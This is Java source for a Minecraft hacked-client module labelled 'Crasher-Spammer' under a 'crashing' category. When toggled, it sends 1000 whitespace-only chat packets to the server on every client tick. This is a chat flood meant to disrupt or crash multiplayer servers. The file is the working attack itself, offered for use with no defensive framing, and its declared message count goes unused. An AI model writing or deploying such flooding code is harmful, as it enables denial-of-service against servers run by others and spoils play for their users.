package dev.o2w9d8.client.module.crashing;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import org.lwjgl.input.Keyboard;
import dev.o2w9d8.client.module.Category;
import dev.o2w9d8.client.module.Module;

public class SpammerModule extends Module {

    private static final int MESSAGE_COUNT = 15; // Number of chat messages to send

    public SpammerModule() {
        super("2w9d8_Crasher-Spammer", Keyboard.KEY_O, Category.CRASHING);
    }

    @Override
    public void onUpdate() {
        if (this.isToggled()) {
            sendChatMessages();
        }
    }

    private void sendChatMessages() {
        for (int i = 0; i < 1000; i++) {
            sendChatMessage("                              ");
        }
    }

    private void sendChatMessage(String message) {
        Minecraft minecraft = Minecraft.getMinecraft();
        C01PacketChatMessage packet = new C01PacketChatMessage(message);
        minecraft.getNetHandler().addToSendQueue(packet);
    }
}
